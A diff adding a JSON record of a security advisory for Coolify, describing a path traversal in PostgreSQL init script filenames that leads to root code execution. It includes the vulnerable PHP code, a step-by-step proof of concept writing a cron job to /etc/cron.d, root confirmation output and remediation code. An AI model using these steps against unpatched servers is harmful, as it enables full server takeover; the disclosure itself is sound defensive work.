@@ -1,0 +1,51 @@
+{
+  "global": null,
+  "id": "GHSA-mv4c-9x67-rrmv",
+  "repo": {
+    "cve_id": "CVE-2026-42200",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22",
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n \r\nA path traversal vulnerability in Coolify's PostgreSQL database init script handling allows any authenticated user (including low-privileged members) to write arbitrary files to the host filesystem. By writing a malicious cron job to `/etc/cron.d/`, an attacker achieves root-level remote code execution on the server.\r\n \r\n### Details\r\n \r\nThe `generate_init_scripts()` method in `app/Actions/Database/StartPostgresql.php` uses user-controlled filenames without path traversal validation. The `validateShellSafePath()` function blocks shell metacharacters but does NOT block directory traversal sequences (`../`).\r\n \r\n**Vulnerable Code - `app/Actions/Database/StartPostgresql.php:296-311`:**\r\n```php\r\nprivate function generate_init_scripts()\r\n{\r\n    foreach ($this->database->init_scripts as $init_script) {\r\n        $filename = data_get($init_script, 'filename');    // USER CONTROLLED\r\n        $content = data_get($init_script, 'content');       // USER CONTROLLED\r\n        $content_base64 = base64_encode($content);\r\n        // VULNERABLE: $filename allows path traversal (../)\r\n        $this->commands[] = \"echo '{$content_base64}' | base64 -d | tee $this->configuration_dir/docker-entrypoint-initdb.d/{$filename} > /dev/null\";\r\n    }\r\n}\r\n```\r\n \r\n**Missing Validation - `bootstrap/helpers/shared.php:121-149`:**\r\n```php\r\nfunction validateShellSafePath(string $input, string $context = 'path'): string\r\n{\r\n    // Blocks: ` $ ; | etc.\r\n    // MISSING: No check for '../' (path traversal)\r\n    return $input;\r\n}\r\n```\r\n\r\n\r\n### Video PoC\r\n\r\nhttps://youtu.be/NlV4HCU3dNA\r\n\r\n\r\n### PoC\r\n \r\n**Environment:**\r\n- Coolify: v4.0.0-beta.470\r\n- Server: Ubuntu 24.04.4 LTS\r\n- User: Member (low-privileged)\r\n \r\n**Step 1:** Login as Member user\r\n \r\n**Step 2:** Create PostgreSQL database via Projects → New Resource → Database → PostgreSQL\r\n \r\n**Step 3:** Add Init Script with path traversal:\r\n```\r\nFilename: ../../../../../etc/cron.d/k4zrce\r\nContent: * * * * * root id > /tmp/root_proof.txt\r\n# end\r\n```\r\n \r\n**Step 4:** Start the database\r\n \r\n**Step 5:** Verify file written on host:\r\n```bash\r\nroot@server:~# cat /etc/cron.d/k4zrce\r\n* * * * * root id > /tmp/root_proof.txt\r\n# end\r\n```\r\n \r\n**Step 6:** Wait 1 minute, verify root execution:\r\n```bash\r\nroot@server:~# cat /tmp/root_proof.txt\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n \r\n**Root RCE Confirmed!**\r\n \r\n### Impact\r\n \r\nAn attacker with any authenticated account (including Member role) can:\r\n- Write arbitrary files to any location on the host filesystem\r\n- Achieve root-level remote code execution via cron job injection\r\n- Fully compromise the server and all hosted applications\r\n- Access all secrets, databases, and source code\r\n- Pivot to other systems in the network\r\n \r\nThis is a **complete server takeover** from a low-privileged user account.\r\n \r\n\r\n\r\n\r\n\r\n## Proof of Concept Evidence\r\n \r\n### 1. Cron file written via path traversal:\r\n```bash\r\nroot@test:/home/test# cat /etc/cron.d/k4zrce\r\n* * * * * root id > /tmp/root_proof.txt\r\n# end\r\n```\r\n \r\n### 2. Root code execution confirmed:\r\n```bash\r\nroot@test:/home/test# cat /tmp/root_proof.txt\r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n \r\n### 3. Cron directory listing:\r\n```bash\r\nroot@test:/home/test# ls -la /etc/cron.d/\r\n-rw-r--r--   1 root root   105 Mar 28 08:09 k4zrce\r\n```\r\n \r\n---\r\n \r\n## Remediation\r\n \r\n1. **Validate filenames** - Block path traversal sequences:\r\n```php\r\nif (preg_match('/\\.\\.\\/|\\.\\.\\\\\\\\/', $filename)) {\r\n    throw new \\Exception(\"Path traversal detected in filename\");\r\n}\r\n```\r\n \r\n2. **Allowlist filenames** - Only allow safe characters:\r\n```php\r\nif (!preg_match('/^[a-zA-Z0-9._-]+\\.sql$/', $filename)) {\r\n    throw new \\Exception(\"Invalid filename format\");\r\n}\r\n```\r\n \r\n3. **Use basename()** - Strip directory components:\r\n```php\r\n$filename = basename($filename);\r\n```\r\n \r\n4. **Update validateShellSafePath()** - Add path traversal check:\r\n```php\r\nif (str_contains($input, '../') || str_contains($input, '..\\\\')) {\r\n    throw new \\Exception(\"Path traversal detected\");\r\n}\r\n```\r\n \r\n---\r\n \r\n## References\r\n \r\n- CWE-22: https://cwe.mitre.org/data/definitions/22.html\r\n- CWE-78: https://cwe.mitre.org/data/definitions/78.html\r\n- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal\r\n ",
+    "ghsa_id": "GHSA-mv4c-9x67-rrmv",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-mv4c-9x67-rrmv",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-mv4c-9x67-rrmv"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-42200"
+      }
+    ],
+    "published_at": "2026-07-02T16:36:32Z",
+    "references": [],
+    "severity": "high",
+    "summary": "PostgreSQL Init Script Path Traversal Leads to Arbitrary File Write and Root RCE",
+    "updated_at": "2026-07-02T16:36:32Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "coollabsio/coolify"
+        },
+        "patched_versions": "4.0.0-beta.474",
+        "vulnerable_version_range": "<= 4.0.0-beta.473"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "coollabsio/coolify"
+}
